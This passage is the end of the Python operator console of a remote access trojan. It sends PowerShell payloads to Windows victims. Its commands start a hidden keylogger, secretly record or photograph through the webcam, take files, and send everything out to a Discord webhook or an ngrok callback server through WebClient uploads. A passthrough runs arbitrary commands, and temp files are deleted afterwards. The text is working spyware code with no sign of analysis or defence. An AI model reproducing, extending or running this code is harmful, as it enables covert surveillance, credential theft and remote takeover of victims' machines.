                    "Write-Output \"[+] Dump sent to Discord ($szMB MB).\""
                )
                print(_send(ps, timeout=180.0))
                continue

            # key-capture
            if c == "key-capture":
                print("[*] Starting background keylogger...")
                ps = (
                    "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
                    "$log=\"$env:TEMP\\kl_$ts.txt\";"
                    "$sb={"
                    "param($lp);"
                    "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;"
                    "public class KL2{"
                    "[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int k);"
                    "[DllImport(\"user32.dll\")]public static extern short GetKeyState(int k);}' -EA 0;"
                    "$sm=@{48=')';49='!';50='@';51='#';52='$';53='%';54='^';55='&';56='*';57='(';"
                    "186=':';187='+';188='<';189='_';190='>';191='?';192='~';219='{';220='|';221='}';222='\"'};"
                    "$nm=@{186=';';187='=';188=',';189='-';190='.';191='/';192='`';219='[';220='\\\\';221=']';222=\"'\"};"
                    "while($true){Start-Sleep -Milliseconds 30;"
                    "for($i=8;$i -le 222;$i++){if([KL2]::GetAsyncKeyState($i) -band 0x0001){"
                    "$sh=[KL2]::GetKeyState(16) -band 0x8000;"
                    "$ca=[KL2]::GetKeyState(20) -band 0x0001;"
                    "$ch=$null;"
                    "if($i -eq 13){$ch=\"\\r\\n\"}"
                    "elseif($i -eq 32){$ch=' '}"
                    "elseif($i -eq 8){$ch='[BS]'}"
                    "elseif($i -eq 9){$ch='[TAB]'}"
                    "elseif($i -eq 46){$ch='[DEL]'}"
                    "elseif($i -ge 65 -and $i -le 90){$ch=if($sh -bxor $ca){[char]$i}else{[char]($i+32)}}"
                    "elseif($i -ge 48 -and $i -le 57){$ch=if($sh){$sm[$i]}else{[char]$i}}"
                    "elseif($i -ge 96 -and $i -le 105){$ch=[char]($i-48)}"
                    "elseif($sm.ContainsKey($i)){$ch=if($sh){$sm[$i]}else{$nm[$i]}};"
                    "if($ch -ne $null){[System.IO.File]::AppendAllText($lp,[string]$ch)}}}}};"
                    "$j=Start-Job -ScriptBlock $sb -ArgumentList $log;"
                    "\"$($j.Id)|$log\"|Set-Content \"$env:TEMP\\kl_job.txt\";"
                    "Write-Output \"[+] Keylogger started (Job $($j.Id)). Type exit-capture to stop.\""
                )
                print(_send_encoded(ps, timeout=25.0))
                continue

            # exit-capture
            if c == "exit-capture":
                print("[*] Stopping keylogger and uploading log...")
                url = CALLBACK_URL
                ps = (
                    "if(-not(Test-Path \"$env:TEMP\\kl_job.txt\")){Write-Output '[-] No keylogger running.'}else{"
                    "$parts=(Get-Content \"$env:TEMP\\kl_job.txt\").Split('|');"
                    "$jId=[int]$parts[0];$lpath=$parts[1];"
                    "Stop-Job -Id $jId -EA 0;Remove-Job -Id $jId -Force -EA 0;"
                    "Remove-Item \"$env:TEMP\\kl_job.txt\" -Force -EA 0;"
                    "if(Test-Path $lpath){"
                    "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
                    f"try{{$wcu.UploadFile('{url}/upload',$lpath)}}catch{{}};$wcu.Dispose();"
                    "Remove-Item $lpath -Force -EA 0;"
                    "Write-Output '[+] Keylog uploaded → ./exfil/'"
                    "}else{Write-Output '[-] No log file found.'}}"
                )
                print(_send(ps, timeout=30.0))
                continue

            # livecam (help)
            if c == "livecam":
                print("\n  livecam sub-commands:")
                print("    livecam-start  — start hidden webcam recording")
                print("    livecam-stop   — stop + send to Discord webhook")
                print("    livecam-save   — stop + save to ./recordings/")
                continue

            # livecam-start
            if c == "livecam-start":
                print("[*] Starting webcam recording on target...")
                b64 = _LC_B64
                ps = (
                    "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
                    "$avi=\"$env:TEMP\\lc_$ts.avi\";"
                    "$flag=\"$env:TEMP\\lc_stop.flag\";"
                    "Remove-Item $flag -EA 0;"
                    "$sp=\"$env:TEMP\\lc_cap.ps1\";"
                    f"[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{b64}'))|Set-Content $sp -Encoding Unicode;"
                    "$proc=Start-Process \"$env:windir\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" -ArgumentList \"-NoP -NonI -STA -ExecutionPolicy Bypass -File `\"$sp`\" `\"$avi`\" `\"$flag`\"\" -PassThru -WindowStyle Hidden;"
                    "\"$($proc.Id)|$avi\"|Set-Content \"$env:TEMP\\lc_job.txt\";"
                    "Write-Output \"[+] Recording started (PID $($proc.Id)). Use livecam-stop or livecam-save.\""
                )
                print(_send(ps, timeout=20.0))
                continue

            # livecam-stop
            if c == "livecam-stop":
                whu = _ask_webhook()
                if not whu:
                    continue
                print("[*] Stopping recording and uploading to Discord...")
                ps = (
                    _DISCORD_UPLOAD +
                    "if(-not(Test-Path \"$env:TEMP\\lc_job.txt\")){Write-Output '[-] No livecam session.'}else{"
                    "$parts=(Get-Content \"$env:TEMP\\lc_job.txt\").Split('|');"
                    "$cpid=[int]$parts[0];$avi=$parts[1];"
                    "'stop'|Set-Content \"$env:TEMP\\lc_stop.flag\";"
                    "Start-Sleep -Seconds 6;"
                    "$pp=Get-Process -Id $cpid -EA 0;"
                    "if($pp -and -not $pp.WaitForExit(10000)){Stop-Process -Id $cpid -Force -EA 0;Start-Sleep -Seconds 2};"
                    "Start-Sleep -Seconds 1;"
                    "Remove-Item \"$env:TEMP\\lc_job.txt\",\"$env:TEMP\\lc_stop.flag\",\"$env:TEMP\\lc_cap.ps1\" -Force -EA 0;"
                    "if(Test-Path $avi){"
                    "$szMB=[Math]::Round((Get-Item $avi).Length/1MB,2);"
                    f"_DU '{whu}' $avi;"
                    "Remove-Item $avi -Force -EA 0;"
                    "Write-Output \"[+] Recording uploaded to Discord ($szMB MB).\""
                    "}else{Write-Output '[-] AVI file not found.'}}"
                )
                print(_send(ps, timeout=60.0))
                continue

            # livecam-save
            if c == "livecam-save":
                print("[*] Stopping recording and saving locally...")
                url = CALLBACK_URL
                ps = (
                    "if(-not(Test-Path \"$env:TEMP\\lc_job.txt\")){Write-Output '[-] No livecam session.'}else{"
                    "$parts=(Get-Content \"$env:TEMP\\lc_job.txt\").Split('|');"
                    "$cpid=[int]$parts[0];$avi=$parts[1];"
                    "'stop'|Set-Content \"$env:TEMP\\lc_stop.flag\";"
                    "Start-Sleep -Seconds 6;"
                    "$pp=Get-Process -Id $cpid -EA 0;"
                    "if($pp -and -not $pp.WaitForExit(10000)){Stop-Process -Id $cpid -Force -EA 0;Start-Sleep -Seconds 2};"
                    "Start-Sleep -Seconds 1;"
                    "Remove-Item \"$env:TEMP\\lc_job.txt\",\"$env:TEMP\\lc_stop.flag\",\"$env:TEMP\\lc_cap.ps1\" -Force -EA 0;"
                    "if(Test-Path $avi){"
                    "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
                    f"try{{$wcu.UploadFile('{url}/upload',$avi)}}catch{{}};$wcu.Dispose();"
                    "Remove-Item $avi -Force -EA 0;"
                    "Write-Output '[+] Recording saved → ./recordings/'"
                    "}else{Write-Output '[-] AVI file not found.'}}"
                )
                print(_send(ps, timeout=60.0))
                continue

            # pic — single webcam snapshot
            if c == "pic":
                print("[*] Activating camera (2 s warm-up)...")
                whu_raw = input("[?] Discord webhook URL (Enter to save locally): ").strip()
                url = CALLBACK_URL
                b64 = _PIC_B64
                common = (
                    "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
                    "$bmp=\"$env:TEMP\\pic_$ts.bmp\";"
                    "$done=\"$env:TEMP\\pic_done.flag\";"
                    "$png=\"$env:TEMP\\pic_$ts.png\";"
                    "Remove-Item $done -Force -EA 0;"
                    "$sp=\"$env:TEMP\\pic_cap.ps1\";"
                    f"[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{b64}'))|Set-Content $sp -Encoding Unicode;"
                    f"Start-Process \"$env:windir\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" -ArgumentList \"-NoP -NonI -STA -ExecutionPolicy Bypass -File `\"$sp`\" `\"$bmp`\" `\"$done`\"\" -WindowStyle Hidden;"
                    "$i=0;while(-not(Test-Path $done) -and $i -lt 40){Start-Sleep -Milliseconds 500;$i++};"
                    "Start-Sleep -Milliseconds 500;"
                    "if((Test-Path $bmp) -and (Get-Item $bmp).Length -gt 0){"
                    "Add-Type -AssemblyName System.Drawing;"
                    "$img=[System.Drawing.Image]::FromFile($bmp);"
                    "$img.Save($png,[System.Drawing.Imaging.ImageFormat]::Png);"
                    "$img.Dispose();"
                )
                if whu_raw:
                    ps = (
                        _DISCORD_UPLOAD +
                        common +
                        f"_DU '{whu_raw}' $png;"
                        "Remove-Item $bmp,$png,$done,$sp -Force -EA 0;"
                        "Write-Output '[+] Photo sent to Discord.'"
                        "}else{Write-Output '[-] No camera — check driver is installed.'}"
                    )
                else:
                    ps = (
                        common +
                        "$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
                        f"try{{$wcu.UploadFile('{url}/upload',$png)}}catch{{}};$wcu.Dispose();"
                        "Remove-Item $bmp,$png,$done,$sp -Force -EA 0;"
                        "Write-Output '[+] Photo saved → ./images/'"
                        "}else{Write-Output '[-] No camera — check driver is installed.'}"
                    )
                print(_send_encoded(ps, timeout=30.0))
                continue

            # download <path>
            if c.startswith("download "):
                raw = cmd.split(" ", 1)[1].strip()
                if ":" in raw or raw.startswith("\\\\"):
                    tf = raw
                else:
                    sep = "" if s.cwd.endswith("\\") else "\\"
                    tf  = f"{s.cwd}{sep}{raw}"
                url = CALLBACK_URL
                sf = tf.replace("'", "''")
                ps = (
                    f"$fp='{sf}';"
                    "if(Test-Path $fp){$wcu=New-Object System.Net.WebClient;$wcu.Headers.Add('ngrok-skip-browser-warning','true');" +
                    f"try{{$wcu.UploadFile('{url}/upload',$fp)}}catch{{}};$wcu.Dispose();"
                    f"Write-Output \"[+] Sent: $fp\"}}"
                    f"else{{Write-Output \"[-] Not found: $fp\"}}"
                )
                print(_send(ps))
                continue

            # passthrough → agent IEX
            act = _active_session()
            if act:
                act.current_task = cmd
                act.task_result  = None
                result = wait_for_result(act)
                if result and result != "(no output)":
                    print(result)

    except KeyboardInterrupt:
        print("\n\n[*] Ctrl+C — shutting down ...")
    finally:
        _shutdown()
        print("[*] All sessions killed. Port 8080 released.")
        print("[*] (TIME_WAIT kernel entries clear automatically in ~60 s)")
        os._exit(0)   # hard exit — skips atexit/gc so no stray threads linger


if __name__ == "__main__":
    main()
